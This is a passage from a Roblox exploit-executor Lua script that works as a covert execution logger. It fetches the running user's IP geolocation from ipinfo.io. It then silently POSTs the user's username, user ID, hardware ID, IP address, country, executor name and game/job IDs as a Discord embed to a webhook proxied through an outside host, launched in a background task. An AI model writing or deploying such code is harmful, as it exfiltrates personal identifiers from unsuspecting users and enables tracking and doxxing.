local function getServerLocation()
    local success, response = pcall(function()
        return HttpService:JSONDecode(game:HttpGet("https://ipinfo.io/" .. IP .. "/json"))
    end)
    if success and response and response.region and response.country then
        local flag = ":flag_" .. response.country:lower() .. ":"
        return response.region .. ", " .. response.country .. " " .. flag
    else
        warn("Failed to fetch server location.")
        return "Unknown Location"
    end
end

local ServerLocation = getServerLocation()

-- Get Game Icon
local function getGameIcon()
    local success, info = pcall(function()
        return MarketplaceService:GetProductInfo(GameID)
    end)
    if success and info and info.IconImageAssetId then
        return "https://www.roblox.com/asset-thumbnail/image?assetId=" .. info.IconImageAssetId .. "&width=768&height=432&format=png"
    else
        warn("Failed to fetch game icon.")
        return "https://via.placeholder.com/768x432?text=No+Game+Icon"
    end
end

local GameIcon = getGameIcon()



-- Webhook Message Sending Function
local function SendMessage(url, Username, HWID, Executor, IP, GameID, JobID, Country, PlayerAvatar, GameIcon, ServerLocation, Platform)
    local headers = {
        ["Content-Type"] = "application/json"
    }

    -- Enhanced Fields with Cool Look and Better Formatting
    local fields = {
        {
            name = "👤 **User Information**",
            value = "Username: **" .. Username .. "**\nUser ID: **" .. tostring(UserId) .. "**\nHWID: **" .. HWID .. "**",
            inline = true
        },
        {
            name = "🌍 **IP & Country**",
            value = "IP: **" .. IP .. "**\nCountry: **" .. Country .. " :flag_" .. Country:lower() .. ":**",
            inline = true
        },
        {
            name = "🌐 **Server Location**",
            value = "Location: **" .. ServerLocation .. "**",
            inline = false
        },
        {
            name = "🕹️ **Executor & Game Info**",
            value = "Executor: **" .. Executor .. "**\nGame ID: **" .. tostring(GameID) .. "**\nJob ID: **" .. JobID .. "**",
            inline = true
        },
    }

    -- JSON Payload for Discord Webhook
    local data = {
        ["content"] = "🚨 **Execution Logged!** 🚨", -- Ensure content is non-empty
        ["embeds"] = {
            {
                ["title"] = "🔒 **Execution Information** 🔒",
                ["description"] = "**Check out the details of this execution below.**",
                ["color"] = 14177041, -- Greenish color for success
                ["fields"] = fields,
                ["author"] = {
                    ["name"] = Username,
                    ["icon_url"] = PlayerAvatar -- Display player avatar in the top left
                },
                ["footer"] = {
                    ["text"] = "Execution Tracker | " .. os.date("%Y-%m-%d %H:%M:%S"),
                    ["icon_url"] = "https://i.imgur.com/2zM9E8A.png" -- Optional footer icon
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
                ["image"] = {
                    ["url"] = GameIcon -- Display game icon as the main image
                },
                ["thumbnail"] = {
                    ["url"] = PlayerAvatar -- Display player avatar as the thumbnail
                },
                ["color"] = 3447003, -- Soft blue background for clarity
            }
        },
        ["attachments"] = {}
    }

    local body = HttpService:JSONEncode(data)

    local requestFunction = syn and syn.request or request or http_request
    if requestFunction then
        local response = requestFunction({
            Url = url,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    else
        warn("No compatible HTTP request function found.")
    end
end

-- Initiate Webhook
if Webhook and string.find(Webhook, "discord") then
    Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
    task.spawn(function()
        SendMessage(Webhook, Username, HWID, Executor, IP, GameID, JobID, Country, PlayerAvatar, GameIcon, ServerLocation, Platform)
    end)
end
